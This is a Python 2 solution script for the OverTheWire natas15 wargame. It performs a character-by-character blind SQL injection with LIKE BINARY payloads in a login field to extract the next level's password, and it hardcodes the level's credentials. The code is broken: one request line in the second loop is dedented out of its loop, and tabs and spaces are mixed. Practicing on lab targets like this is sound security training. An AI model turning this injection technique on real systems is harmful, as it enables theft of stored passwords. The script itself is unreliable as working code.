#!/usr/bin/env python
import requests
#blind SQL injection 
url='http://natas15.natas.labs.overthewire.org/index.php?debug'
chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
#all chars whitch can be 
filtered=''
passwd=''
auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
for char in chars:
	Data={'username':'natas16" and password LIKE BINARY "%' + char +'%" #'}
	#LIKE simple pattern matching for binary string
	r = requests.post(url, auth=auth, data = Data)
	if 'exists' in r.text :
	#catch is returning text containts text "exist" witch shows result is true
        	filtered = filtered + char
print filtered
for i in range(0,32):
	for char in filtered:
        	Data={'username':'natas16" and password LIKE BINARY "' + passwd + char +'%" #'}
		#there dont need % because we use basswd first
r = requests.post(url, auth=auth, data = Data)
        	if 'exists' in r.text :
			passwd = passwd + char
			print(passwd)
			break
